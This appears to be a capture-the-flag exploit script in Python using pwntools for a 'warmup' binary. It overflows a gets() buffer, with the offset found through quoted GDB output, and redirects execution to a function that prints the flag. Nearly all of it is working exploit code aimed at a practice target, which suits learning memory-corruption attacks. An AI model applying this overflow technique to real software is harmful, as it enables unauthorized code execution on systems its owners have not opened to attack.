from pwn import *
'''
void main(void)

{
  char local_88 [64];
  char local_48 [64];
  
  write(1,"-Warm Up-\n",10);
  write(1,&DAT_0040074c,4);
  sprintf(local_88,"%p\n",easy);
  write(1,local_88,9);
  write(1,&DAT_00400755,1);
  gets(local_48);
  return;
}
'''

#load process
p = process('./warmup')
#  64 bits
# address 0x0040060d --> easy function address
"""
void easy(void)

{
  system("cat flag.txt");
  return;
}
"""
address = p64(0x0040060d)

"""
gdb-peda$ find 'whereis'
Searching for 'whereis' in: None ranges
Found 2 results, display max 2 items:
 [heap] : 0x6022a0 ("whereis\n")
[stack] : 0x7fffffffded0 --> 0x73696572656877 ('whereis')


gdb-peda$ i f
Stack level 0, frame at 0x7fffffffdf20:
 rip = 0x4006a3 in main; saved rip = 0x7ffff7e0ae0b
 called by frame at 0x7fffffffdfe0
 Arglist at 0x7fffffffdf10, args: 
 Locals at 0x7fffffffdf10, Previous frame's sp is 0x7fffffffdf20
 Saved registers:
  rbp at 0x7fffffffdf10, rip at 0x7fffffffdf18

"""
# 0x7fffffffdf18 - 0x7fffffffded0 = 0x48
offset  = "\x00" * 0x48
payload = offset + address
p.sendline(payload)
p.interactive()
